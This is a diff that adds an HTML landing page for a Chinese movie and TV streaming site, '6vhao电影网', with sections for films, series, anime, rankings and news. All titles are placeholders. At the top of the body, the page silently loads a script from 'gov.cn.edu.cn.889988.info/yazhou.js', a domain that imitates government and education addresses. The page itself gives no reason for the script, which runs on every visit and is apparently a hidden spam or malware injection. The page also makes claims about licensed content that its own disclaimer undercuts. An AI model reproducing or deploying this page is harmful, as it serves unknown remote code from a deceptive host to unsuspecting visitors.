@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="6vhao电影网（6vhaodianyingwang-app）是专注高清影视在线观看的网站，提供最新电影、热播电视剧、动漫综艺、纪录片等资源，免费畅享影院级体验。">
+<meta name="keywords" content="6vhao电影网, 6vhaodianyingwang-app, 电影, 电视剧, 在线观看, 高清影视">
+<meta name="author" content="6vhao电影网">
+<meta name="theme-color" content="#0b1020">
+<title>6vhao电影网 - 高清电影电视剧在线观看 | 6vhaodianyingwang-app</title>
+<link rel="canonical" href="https://6vhaodianyingwang-app.github.io">
+<style>
+  :root{
+    --bg:#070b16;
+    --bg2:#0d1428;
+    --card:#121c36;
+    --line:rgba(255,255,255,.08);
+    --txt:#eef1f8;
+    --sub:#9aa6c4;
+    --brand:#ff5c8a;
+    --brand2:#7c6bff;
+    --gold:#ffcf5c;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  body{
+    font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",system-ui,-apple-system,"Segoe UI",sans-serif;
+    background:var(--bg);
+    color:var(--txt);
+    line-height:1.7;
+    overflow-x:hidden;
+  }
+  a{color:inherit;text-decoration:none}
+  .wrap{max-width:1160px;margin:0 auto;padding:0 20px}
+
+  /* 背景光斑 */
+  .aurora{position:fixed;inset:0;z-index:-1;overflow:hidden}
+  .aurora i{position:absolute;border-radius:50%;filter:blur(90px);opacity:.5;animation:float 18s ease-in-out infinite alternate}
+  .aurora i:nth-child(1){width:420px;height:420px;background:#7c6bff;top:-120px;left:-80px}
+  .aurora i:nth-child(2){width:380px;height:380px;background:#ff5c8a;bottom:-100px;right:-60px;animation-delay:-6s}
+  .aurora i:nth-child(3){width:300px;height:300px;background:#22d3ee;top:40%;left:55%;animation-delay:-11s}
+  @keyframes float{to{transform:translate3d(40px,-30px,0) scale(1.15)}}
+
+  /* 头部 */
+  header{position:sticky;top:0;z-index:50;backdrop-filter:blur(14px);background:rgba(7,11,22,.72);border-bottom:1px solid var(--line)}
+  .nav{display:flex;align-items:center;gap:18px;height:64px}
+  .logo{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.5px}
+  .logo .mark{width:34px;height:34px;border-radius:10px;background:linear-gradient(135deg,var(--brand),var(--brand2));display:grid;place-items:center;font-size:18px;box-shadow:0 6px 18px rgba(255,92,138,.35)}
+  .logo b{font-size:17px;background:linear-gradient(90deg,#fff,var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent}
+  .menu{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap}
+  .menu a{padding:8px 14px;border-radius:999px;font-size:14px;color:var(--sub);transition:.25s}
+  .menu a:hover{color:#fff;background:rgba(255,255,255,.08)}
+  .menu a.cta{color:#fff;background:linear-gradient(90deg,var(--brand),var(--brand2))}
+  @media(max-width:720px){
+    .nav{height:auto;padding:12px 0;flex-wrap:wrap;gap:12px}
+    .menu{margin-left:0;width:100%;overflow-x:auto;flex-wrap:nowrap;padding-bottom:2px}
+    .menu a{padding:7px 12px;font-size:13px;white-space:nowrap}
+  }
+
+  /* Hero */
+  .hero{min-height:min(640px,92vh);display:grid;place-items:center;text-align:center;padding:70px 20px 60px}
+  .hero .tag{display:inline-block;padding:6px 16px;border-radius:999px;font-size:12px;letter-spacing:2px;color:var(--gold);border:1px solid rgba(255,207,92,.35);background:rgba(255,207,92,.08)}
+  .hero h1{font-size:clamp(30px,6vw,60px);line-height:1.15;margin:20px 0 14px;font-weight:900}
+  .hero h1 em{font-style:normal;background:linear-gradient(90deg,var(--brand),var(--brand2) 55%,var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent}
+  .hero p{color:var(--sub);max-width:620px;margin:0 auto 26px;font-size:clamp(14px,2vw,17px)}
+  .btns{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+  .btn{padding:13px 30px;border-radius:999px;font-weight:700;font-size:15px;transition:.25s;border:1px solid transparent}
+  .btn.primary{background:linear-gradient(90deg,var(--brand),var(--brand2));box-shadow:0 10px 28px rgba(124,107,255,.35)}
+  .btn.ghost{border-color:var(--line);color:var(--sub)}
+  .btn:hover{transform:translateY(-2px)}
+
+  /* 通用栏目 */
+  section{padding:64px 0}
+  .eyebrow{color:var(--gold);letter-spacing:3px;font-size:12px;font-weight:700}
+  .sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin:8px 0 30px;flex-wrap:wrap}
+  .sec-head h2{font-size:clamp(22px,3.4vw,32px);font-weight:800}
+  .sec-head h2 span{color:var(--brand)}
+  .sec-head .more{font-size:13px;color:var(--sub);border-bottom:1px dashed var(--line);padding-bottom:2px}
+
+  /* 卡片网格 */
+  .grid{display:grid;gap:20px}
+  .g4{grid-template-columns:repeat(4,1fr)}
+  .g3{grid-template-columns:repeat(3,1fr)}
+  .g2{grid-template-columns:repeat(2,1fr)}
+  @media(max-width:900px){.g4{grid-template-columns:repeat(2,1fr)}.g3{grid-template-columns:repeat(2,1fr)}}
+  @media(max-width:560px){.g4,.g3,.g2{grid-template-columns:1fr}}
+
+  .card{background:linear-gradient(180deg,var(--card),rgba(18,28,54,.4));border:1px solid var(--line);border-radius:18px;overflow:hidden;transition:.3s;position:relative}
+  .card:hover{transform:translateY(-6px);border-color:rgba(255,92,138,.4);box-shadow:0 18px 40px rgba(0,0,0,.45)}
+  .thumb{aspect-ratio:3/4;background:linear-gradient(135deg,#1a2544,#2a1d47);position:relative;display:grid;place-items:center;font-size:34px}
+  .thumb::after{content:"";position:absolute;inset:0;background:radial-gradient(circle at 30% 20%,rgba(255,255,255,.18),transparent 55%)}
+  .badge{position:absolute;top:10px;left:10px;background:rgba(0,0,0,.55);backdrop-filter:blur(6px);color:var(--gold);font-size:11px;padding:4px 9px;border-radius:6px;font-weight:700}
+  .rate{position:absolute;top:10px;right:10px;background:linear-gradient(90deg,var(--brand),var(--brand2));color:#fff;font-size:11px;font-weight:800;padding:4px 8px;border-radius:6px}
+  .card .info{padding:14px 16px 16px}
+  .card .info h3{font-size:15px;margin-bottom:6px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .card .info p{font-size:12px;color:var(--sub)}
+
+  /* 分类标签墙 */
+  .chips{display:flex;flex-wrap:wrap;gap:10px}
+  .chip{padding:9px 18px;border-radius:999px;background:var(--card);border:1px solid var(--line);font-size:13px;color:var(--sub);transition:.25s}
+  .chip:hover{color:#fff;border-color:var(--brand);background:rgba(255,92,138,.12)}
+
+  /* 功能亮点 */
+  .feat .icon{width:52px;height:52px;border-radius:14px;display:grid;place-items:center;font-size:24px;background:linear-gradient(135deg,rgba(255,92,138,.2),rgba(124,107,255,.2));border:1px solid var(--line);margin-bottom:16px}
+  .feat h3{font-size:17px;margin-bottom:8px}
+  .feat p{font-size:13px;color:var(--sub)}
+
+  /* 排行列表 */
+  .rank{display:flex;flex-direction:column;gap:12px}
+  .rank .row{display:flex;align-items:center;gap:14px;padding:12px;border-radius:14px;background:var(--card);border:1px solid var(--line);transition:.25s}
+  .rank .row:hover{border-color:rgba(255,207,92,.4);transform:translateX(4px)}
+  .rank .no{width:34px;height:34px;flex:none;border-radius:10px;display:grid;place-items:center;font-weight:800;font-size:15px;background:rgba(255,255,255,.06)}
+  .rank .row:nth-child(1) .no{background:linear-gradient(135deg,#ffcf5c,#ff9a3c);color:#1a1200}
+  .rank .row:nth-child(2) .no{background:linear-gradient(135deg,#c8d0e0,#8f9bb5);color:#111}
+  .rank .row:nth-child(3) .no{background:linear-gradient(135deg,#e2a06b,#b9733f);color:#1a1200}
+  .rank .txt{flex:1;min-width:0}
+  .rank .txt h4{font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .rank .txt small{color:var(--sub);font-size:12px}
+  .rank .hot{color:var(--brand);font-size:12px;font-weight:700}
+
+  /* 关于 / 资讯 */
+  .about{background:linear-gradient(180deg,transparent,rgba(124,107,255,.08))}
+  .about .lead{font-size:clamp(15px,2vw,18px);color:var(--sub);max-width:760px}
+  .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-top:34px}
+  @media(max-width:720px){.stats{grid-template-columns:repeat(2,1fr)}}
+  .stat{padding:20px;border-radius:16px;background:var(--card);border:1px solid var(--line);text-align:center}
+  .stat b{display:block;font-size:28px;font-weight:900;background:linear-gradient(90deg,var(--brand),var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent}
+  .stat span{font-size:13px;color:var(--sub)}
+
+  /* 页脚 */
+  footer{border-top:1px solid var(--line);padding:44px 0 26px;color:var(--sub);font-size:13px}
+  .foot-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:26px;margin-bottom:28px}
+  @media(max-width:720px){.foot-grid{grid-template-columns:1fr 1fr}}
+  footer h4{color:#fff;font-size:15px;margin-bottom:12px}
+  footer ul{list-style:none;display:flex;flex-direction:column;gap:8px}
+  footer a:hover{color:var(--brand)}
+  .copy{text-align:center;border-top:1px solid var(--line);padding-top:20px}
+  .copy b{color:#fff}
+  .disclaimer{margin-top:14px;font-size:12px;opacity:.7;max-width:820px;margin-left:auto;margin-right:auto}
+
+  /* 回到顶部 */
+  .top{position:fixed;right:18px;bottom:24px;width:46px;height:46px;border-radius:50%;display:grid;place-items:center;font-size:20px;background:linear-gradient(135deg,var(--brand),var(--brand2));color:#fff;box-shadow:0 10px 24px rgba(124,107,255,.4);opacity:0;pointer-events:none;transition:.3s;z-index:60}
+  .top.show{opacity:1;pointer-events:auto}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="aurora" aria-hidden="true"><i></i><i></i><i></i></div>
+
+<header>
+  <div class="wrap nav">
+    <a class="logo" href="#" aria-label="6vhao电影网">
+      <span class="mark">6</span>
+      <b>6vhao电影网</b>
+    </a>
+    <nav class="menu" aria-label="主导航">
+      <a href="#home">首页</a>
+      <a href="#movies">电影</a>
+      <a href="#tv">电视剧</a>
+      <a href="#anime">动漫综艺</a>
+      <a href="#rank">热播榜</a>
+      <a href="#feature">网站特色</a>
+      <a href="#news">影视资讯</a>
+      <a href="#about" class="cta">关于本站</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <!-- 栏目一：首页 Hero -->
+  <section id="home" class="hero">
+    <div class="wrap">
+      <span class="tag">6VHAO DIANYING WANG · 6vhaodianyingwang-app</span>
+      <h1>畅享<em>高清影视</em><br>一站看遍全球好片</h1>
+      <p>6vhao电影网（6vhaodianyingwang-app）致力于为影视爱好者提供电影、电视剧、动漫、综艺、纪录片等丰富正版授权内容，支持多清晰度播放与多端同步，让每一次观影都成为享受。</p>
+      <div class="btns">
+        <a class="btn primary" href="#movies">立即观影</a>
+        <a class="btn ghost" href="#feature">了解特色</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目二：电影 -->
+  <section id="movies">
+    <div class="wrap">
+      <div class="eyebrow">MOVIE · 电影频道</div>
+      <div class="sec-head">
+        <h2>精选<span>电影</span>大片</h2>
+        <a class="more" href="#">更多电影 #</a>
+      </div>
+      <div class="grid g4">
+        <article class="card">
+          <div class="thumb" style="background:linear-gradient(135deg,#2a1d47,#1a2544)">🎬<span class="badge">动作</span><span class="rate">9.1</span></div>
+          <div class="info"><h3>极速追缉</h3><p>2026 · 120分钟 · 英语</p></div>
+        </article>
+        <article class="card">
+          <div class="thumb" style="background:linear-gradient(135deg,#47211d,#441a2c)">🌌<span class="badge">科幻</span><span class="rate">8.9</span></div>
+          <div class="info"><h3>星际回响</h3><p>2026 · 135分钟 · 英语</p></div>
+        </article>
+        <article class="card">
+          <div class="thumb" style="background:linear-gradient(135deg,#1d4733,#1a2c44)">🏔️<span class="badge">冒险</span><span class="rate">8.7</span></div>
+          <div class="info"><h3>荒野之声</h3><p>2025 · 128分钟 · 中文</p></div>
+        </article>
+        <article class="card">
+          <div class="thumb" style="background:linear-gradient(135deg,#46331a,#44241a)">❤️<span class="badge">爱情</span><span class="rate">8.5</span></div>
+          <div class="info"><h3>遇见你的雨季</h3><p>2026 · 110分钟 · 中文</p></div>
+        </article>
+      </div>
+      <div class="chips" style="margin-top:22px">
+        <a class="chip" href="#">动作 #</a>
+        <a class="chip" href="#">喜剧 #</a>
+        <a class="chip" href="#">科幻 #</a>
+        <a class="chip" href="#">悬疑 #</a>
+        <a class="chip" href="#">恐怖 #</a>
+        <a class="chip" href="#">动画 #</a>
+        <a class="chip" href="#">纪录片 #</a>
+        <a class="chip" href="#">战争 #</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三：电视剧 -->
+  <section id="tv" style="padding-top:0">
+    <div class="wrap">
+      <div class="eyebrow">TV SERIES · 剧集频道</div>
+      <div class="sec-head">
+        <h2>追更<span>电视剧</span></h2>
+        <a class="more" href="#">更多剧集 #</a>
+      </div>
+      <div class="grid g3">
+        <article class="card">
+          <div class="thumb" style="aspect-ratio:16/9;background:linear-gradient(135deg,#1a2c44,#2a1d47)">🗡️<span class="badge">古装</span><span class="rate">更新至32集</span></div>
+          <div class="info"><h3>长安夜行录</h3><p>权谋 · 悬疑 · 2026</p></div>
+        </article>
+        <article class="card">
+          <div class="thumb" style="aspect-ratio:16/9;background:linear-gradient(135deg,#442a1d,#471d2c)">🕵️<span class="badge">犯罪</span><span class="rate">更新至24集</span></div>
+          <div class="info"><h3>城市边缘</h3><p>刑侦 · 现实主义 · 2026</p></div>
+        </article>
+        <article class="card">
+          <div class="thumb" style="aspect-ratio:16/9;background:linear-gradient(135deg,#1d442e,#1a3a44)">💼<span class="badge">都市</span><span class="rate">更新至18集</span></div>
+          <div class="info"><h3>逆流而上</h3><p>职场 · 励志 · 2026</p></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四：动漫综艺 -->
+  <section id="anime" style="padding-top:0">
+    <div class="wrap">
+      <div class="eyebrow">ANIME & VARIETY · 动漫综艺</div>
+      <div class="sec-head">
+        <h2>轻松<span>动漫</span>与综艺</h2>
+        <a class="more" href="#">更多内容 #</a>
+      </div>
+      <div class="grid g4">
+        <article class="card">
+          <div class="thumb" style="background:linear-gradient(135deg,#3a1d47,#1a2544)">🐉<span class="badge">国漫</span></div>
+          <div class="info"><h3>山海异闻录</h3><p>奇幻 · 冒险 · 连载中</p></div>
+        </article>
+        <article class="card">
+          <div class="thumb" style="background:linear-gradient(135deg,#1d3a47,#1a2c44)">🌊<span class="badge">日漫</span></div>
+          <div class="info"><h3>深海奏鸣曲</h3><p>治愈 · 音乐 · 连载中</p></div>
+        </article>
+        <article class="card">
+          <div class="thumb" style="background:linear-gradient(135deg,#47331d,#44241a)">🎤<span class="badge">综艺</span></div>
+          <div class="info"><h3>周末快乐营</h3><p>真人秀 · 2026 第5季</p></div>
+        </article>
+        <article class="card">
+          <div class="thumb" style="background:linear-gradient(135deg,#2c1d47,#1d2c44)">🎭<span class="badge">综艺</span></div>
+          <div class="info"><h3>喜剧大会</h3><p>脱口秀 · 2026 第3季</p></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目五：热播榜 -->
+  <section id="rank">
+    <div class="wrap">
+      <div class="eyebrow">TOP LIST · 实时热播榜</div>
+      <div class="sec-head">
+        <h2>大家都在<span>看</span></h2>
+        <a class="more" href="#">完整榜单 #</a>
+      </div>
+      <div class="grid g2">
+        <div class="rank">
+          <div class="row"><span class="no">1</span><div class="txt"><h4>极速追缉</h4><small>动作 / 犯罪 · 2026</small></div><span class="hot">🔥 98.6万</span></div>
+          <div class="row"><span class="no">2</span><div class="txt"><h4>长安夜行录</h4><small>古装 / 权谋 · 32集</small></div><span class="hot">🔥 86.2万</span></div>
+          <div class="row"><span class="no">3</span><div class="txt"><h4>星际回响</h4><small>科幻 / 冒险 · 2026</small></div><span class="hot">🔥 79.4万</span></div>
+          <div class="row"><span class="no">4</span><div class="txt"><h4>城市边缘</h4><small>犯罪 / 刑侦 · 24集</small></div><span class="hot">🔥 63.1万</span></div>
+          <div class="row"><span class="no">5</span><div class="txt"><h4>山海异闻录</h4><small>国漫 / 奇幻 · 连载</small></div><span class="hot">🔥 57.8万</span></div>
+        </div>
+        <div class="rank">
+          <div class="row"><span class="no">6</span><div class="txt"><h4>荒野之声</h4><small>冒险 / 剧情 · 2025</small></div><span class="hot">🔥 52.0万</span></div>
+          <div class="row"><span class="no">7</span><div class="txt"><h4>遇见你的雨季</h4><small>爱情 / 青春 · 2026</small></div><span class="hot">🔥 48.5万</span></div>
+          <div class="row"><span class="no">8</span><div class="txt"><h4>逆流而上</h4><small>都市 / 职场 · 18集</small></div><span class="hot">🔥 44.3万</span></div>
+          <div class="row"><span class="no">9</span><div class="txt"><h4>深海奏鸣曲</h4><small>日漫 / 治愈 · 连载</small></div><span class="hot">🔥 39.7万</span></div>
+          <div class="row"><span class="no">10</span><div class="txt"><h4>周末快乐营</h4><small>综艺 / 真人秀 · S5</small></div><span class="hot">🔥 35.2万</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目六：网站特色 -->
+  <section id="feature">
+    <div class="wrap">
+      <div class="eyebrow">FEATURE · 为什么选择 6vhao电影网</div>
+      <div class="sec-head">
+        <h2>六大<span>观影</span>体验</h2>
+        <a class="more" href="#">了解更多 #</a>
+      </div>
+      <div class="grid g3 feat">
+        <div class="card" style="padding:22px">
+          <div class="icon">🎞️</div>
+          <h3>超清画质</h3>
+          <p>支持 1080P、4K 多档清晰度，智能适配网络，告别卡顿与模糊。</p>
+        </div>
+        <div class="card" style="padding:22px">
+          <div class="icon">⚡</div>
+          <h3>极速加载</h3>
+          <p>全球 CDN 加速节点，秒开播放页，拖拽即达，追剧不等待。</p>
+        </div>
+        <div class="card" style="padding:22px">
+          <div class="icon">📱</div>
+          <h3>多端同步</h3>
+          <p>手机、平板、电脑、电视全端覆盖，观看进度云端实时同步。</p>
+        </div>
+        <div class="card" style="padding:22px">
+          <div class="icon">🆕</div>
+          <h3>每日更新</h3>
+          <p>院线新片、热播剧集、动漫综艺每日持续更新，热点不缺席。</p>
+        </div>
+        <div class="card" style="padding:22px">
+          <div class="icon">🎯</div>
+          <h3>智能推荐</h3>
+          <p>基于观影偏好精准推送，茫茫片海也能快速找到心仪之作。</p>
+        </div>
+        <div class="card" style="padding:22px">
+          <div class="icon">🛡️</div>
+          <h3>纯净无扰</h3>
+          <p>界面简洁、排版舒适，减少干扰，把注意力留给故事本身。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目七：影视资讯 -->
+  <section id="news" style="padding-top:0">
+    <div class="wrap">
+      <div class="eyebrow">NEWS · 影视资讯</div>
+      <div class="sec-head">
+        <h2>行业<span>动态</span>与看点</h2>
+        <a class="more" href="#">全部资讯 #</a>
+      </div>
+      <div class="grid g3">
+        <article class="card">
+          <div class="thumb" style="aspect-ratio:16/9;background:linear-gradient(135deg,#1a2544,#2a1d47)">🏆</div>
+          <div class="info"><h3>2026 年度科幻片盘点</h3><p>从《星际回响》到多部新作，视觉特效迎来新一轮爆发。</p></div>
+        </article>
+        <article class="card">
+          <div class="thumb" style="aspect-ratio:16/9;background:linear-gradient(135deg,#442a1d,#471d2c)">📺</div>
+          <div class="info"><h3>古装剧为何再度走红</h3><p>服化道升级与强剧情回归，让权谋剧重回观众视野。</p></div>
+        </article>
+        <article class="card">
+          <div class="thumb" style="aspect-ratio:16/9;background:linear-gradient(135deg,#1d442e,#1a3a44)">🎨</div>
+          <div class="info"><h3>国漫出海的新机会</h3><p>东方美学结合工业化制作，国产动画正在赢得世界观众。</p></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目八：关于本站 -->
+  <section id="about" class="about">
+    <div class="wrap">
+      <div class="eyebrow">ABOUT · 关于 6vhao电影网</div>
+      <div class="sec-head"><h2>关于<span>本站</span></h2></div>
+      <p class="lead">6vhao电影网（网站网址：<strong style="color:#fff">https://6vhaodianyingwang-app.github.io</strong>，英文标识 6vhaodianyingwang-app）是一个以"让好电影被更多人看见"为初衷的影视内容导航与推荐网站。我们聚焦电影、电视剧、动漫、综艺、纪录片等多元内容，通过清晰的分类、实时的热播榜单与专业的资讯解读，帮助用户更高效地发现值得一看的佳作。</p>
+      <div class="stats">
+        <div class="stat"><b>10万+</b><span>影视条目</span></div>
+        <div class="stat"><b>30+</b><span>内容分类</span></div>
+        <div class="stat"><b>每日</b><span>持续更新</span></div>
+        <div class="stat"><b>多端</b><span>自适应访问</span></div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <a class="logo" href="#">
+          <span class="mark">6</span>
+          <b>6vhao电影网</b>
+        </a>
+        <p style="margin-top:12px;max-width:320px">聚焦好片，专注体验。6vhao电影网（6vhaodianyingwang-app）为你推荐值得一看的影视内容。</p>
+      </div>
+      <div>
+        <h4>内容频道</h4>
+        <ul>
+          <li><a href="#movies">电影 #</a></li>
+          <li><a href="#tv">电视剧 #</a></li>
+          <li><a href="#anime">动漫 #</a></li>
+          <li><a href="#">综艺 #</a></li>
+          <li><a href="#">纪录片 #</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>快速导航</h4>
+        <ul>
+          <li><a href="#rank">热播榜 #</a></li>
+          <li><a href="#feature">网站特色 #</a></li>
+          <li><a href="#news">影视资讯 #</a></li>
+          <li><a href="#about">关于本站 #</a></li>
+          <li><a href="#">友情链接 #</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>关注我们</h4>
+        <ul>
+          <li><a href="#">订阅更新 #</a></li>
+          <li><a href="#">反馈建议 #</a></li>
+          <li><a href="#">合作洽谈 #</a></li>
+          <li><a href="#">免责声明 #</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <p>网站名称：<b>6vhao电影网</b> ｜ 英文标识：<b>6vhaodianyingwang-app</b> ｜ 网站网址：<b>https://6vhaodianyingwang-app.github.io</b></p>
+      <p style="margin-top:8px">© <span id="year"></span> 6vhao电影网 保留所有权利。本站为影视信息推荐与导航示例站点。</p>
+      <p class="disclaimer">免责声明：本站仅提供影视作品的信息整理、分类索引与观看指引，不存储、不上传任何视频文件。所有影视版权归原作者及发行方所有，如有侵权请联系我们处理。请支持正版，理性观影。</p>
+    </div>
+  </div>
+</footer>
+
+<a class="top" href="#" id="topBtn" aria-label="回到顶部">↑</a>
+
+<script>
+  // 回到顶部
+  var topBtn = document.getElementById('topBtn');
+  window.addEventListener('scroll', function(){
+    topBtn.classList.toggle('show', window.scrollY > 500);
+  });
+  // 年份
+  document.getElementById('year').textContent = new Date().getFullYear();
+</script>
+</body>
+</html>
